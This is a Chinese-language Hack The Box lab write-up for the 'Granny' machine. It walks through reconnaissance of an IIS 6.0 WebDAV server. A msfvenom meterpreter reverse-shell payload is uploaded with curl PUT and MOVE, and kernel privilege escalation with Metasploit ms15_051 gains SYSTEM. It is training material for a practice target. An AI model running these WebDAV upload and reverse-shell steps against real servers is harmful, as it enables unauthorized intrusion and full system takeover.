靶机 10.10.10.15

kali 10.10.16.5

[Hack The Box Writeup - Granny | Korbinian Spielvogel (korbinian-spielvogel.de)](https://korbinian-spielvogel.de/posts/granny-writeup/)



```bash
└─# ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
```

```bash
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sun, 10 Sep 2023 03:11:06 GMT
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



```
└─# nikto -host 10.10.10.15  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.15
+ Target Hostname:    10.10.10.15
+ Target Port:        80
+ Start Time:         2023-09-09 23:11:17 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ /: Retrieved microsoftofficewebserver header: 5.0_Pub.
+ /: Retrieved x-powered-by header: ASP.NET.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /ocvoxW8M.asmx: Retrieved x-aspnet-version header: 1.1.4322.
^C               
```



IIS6.0

查看 允许方法

```
curl -X OPTIONS http://10.10.10.15 -vv  
```



打点方法一：

```bash
└─# searchsploit iis 6.0         
------------------------------------------------------------------------------------------------------------
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                        | windows/remote/41738.py
```



打点方法二：

web 允许的方法太多了，可以利用 WebDAV PUT/MOVE

`davtest` 工具快速查看也以上传的文件，以及可以执行的脚本格式

```bash
└─# davtest -url http://10.10.10.15
```

```bash
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: mb9GFe
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_mb9GFe
********************************************************
 Sending test files
PUT	cgi	FAIL
PUT	asp	FAIL
PUT	aspx	FAIL
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.html
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.jhtml
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.pl
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.txt
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.jsp
PUT	shtml	FAIL
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.cfm
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.php
********************************************************
 Checking for test file execution
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.html
EXEC	html	FAIL
EXEC	jhtml	FAIL
EXEC	pl	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.txt
EXEC	txt	FAIL
EXEC	jsp	FAIL
EXEC	cfm	FAIL
EXEC	php	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_mb9GFe
PUT File: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.html
PUT File: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.jhtml
PUT File: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.pl
PUT File: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.txt
PUT File: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.jsp
PUT File: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.cfm
PUT File: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.php
Executes: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.html
Executes: http://10.10.10.15/DavTestDir_mb9GFe/davtest_mb9GFe.txt
```

跟随图片步骤

<img src=".\图片\granny_webdav_exploit.png" alt="granny_webdav_exploit" style="zoom:80%;" />

因为 nikto 扫到 .net ，所以我们 put 方法上传文件，配合 copy  方法修改覆盖文件名为 asp

msf 生成反向 shell 的 asp 格式，但扩展名为 txt

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=6666 -f asp -o shell.txt
```

msf 监听 反向 shell

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 6666
lport => 6666
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.5:6666 
```

再 put 上传 shell.txt ，copy 覆盖为 shell.asp，在访问 shell.asp 触发

```bash
└─# curl -X PUT --upload-file shell.txt http://10.10.10.15/shell.txt
└─# curl -X MOVE --header 'Destination:http://10.10.10.15/shell.asp' 'http://10.10.10.15/shell.txt'
└─# curl http://10.10.10.15/shell.asp
```

监听的得到 meterpreter

```bash
meterpreter > pwd
c:\windows\system32\inetsrv
```



提权：

内核提权，msf 自动枚举 ，msf 自动利用

```bash
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

```
#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 9   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 10  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The check raised an exception.
 12  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_eventvwr                       No                       The target is not exploitable.
 14  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 15  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 16  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 17  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
 18  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 19  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 20  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 21  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 22  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 23  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 24  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 25  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 26  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows .NET Server (5.2 Build 3790, Service Pack 2). is not vulnerable
 27  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 28  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 29  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 30  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The check raised an exception.
 31  exploit/windows/local/ms16_075_reflection                      No                       The check raised an exception.
 32  exploit/windows/local/ms16_075_reflection_juicy                No                       The check raised an exception.
 33  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 34  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 35  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.
 36  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 39  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.
```

要先进程迁移 migrate xxx，因为我使用  `exploit/windows/local/ms15_051_client_copy_image` 没进程迁移失败了

```bash
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.16.5:1234 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 2988 launched.
[*] Reflectively injecting the DLL into 2988...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
```

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```



flag路径

```
c:\Documents and Settings\Lakis\Desktop\user.txt
c:\Documents and Settings\Administrator\Desktop\root.txt
```


